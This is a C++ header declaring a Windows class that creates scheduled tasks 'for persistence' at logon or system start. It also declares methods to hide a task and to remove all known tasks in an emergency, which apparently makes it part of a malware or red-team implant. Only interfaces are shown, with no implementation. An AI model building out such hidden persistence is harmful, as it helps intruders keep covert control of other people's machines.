// File: SchedulePersistence.h
#pragma once

#include "core/Logger.h"
#include <string>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")

namespace persistence {

class SchedulePersistence {
public:
    SchedulePersistence(std::shared_ptr<core::Logger> logger);
    ~SchedulePersistence();

    // Delete copy constructor and assignment operator
    SchedulePersistence(const SchedulePersistence&) = delete;
    SchedulePersistence& operator=(const SchedulePersistence&) = delete;

    /**
     * @brief Creates scheduled task for persistence
     * @param taskName Name of the scheduled task
     * @param executablePath Path to the executable
     * @param triggerType Type of trigger (LOGON, SYSTEMSTART, etc.)
     * @param delayMinutes Delay after trigger in minutes
     * @return true if creation successful
     */
    bool install(const std::string& taskName, const std::string& executablePath,
                int triggerType, int delayMinutes = 0);

    /**
     * @brief Removes scheduled task
     * @param taskName Name of the task to remove
     * @return true if removal successful
     */
    bool remove(const std::string& taskName);

    /**
     * @brief Checks if scheduled task exists
     * @param taskName Name of the task to check
     * @return true if task exists
     */
    bool exists(const std::string& taskName) const;

    /**
     * @brief Attempts to hide scheduled task
     */
    bool hideTask(const std::string& taskName);

    /**
     * @brief Emergency removal of all known scheduled tasks
     */
    void emergencyRemove();

private:
    /**
     * @brief Connects to Task Scheduler service
     */
    bool connectToTaskScheduler();

    /**
     * @brief Creates task definition with specified parameters
     */
    ITaskDefinition* createTaskDefinition(const std::string& executablePath,
                                        int triggerType, int delayMinutes) const;

    ITaskService* taskService_;
    std::shared_ptr<core::Logger> logger_;
};

} // namespace persistence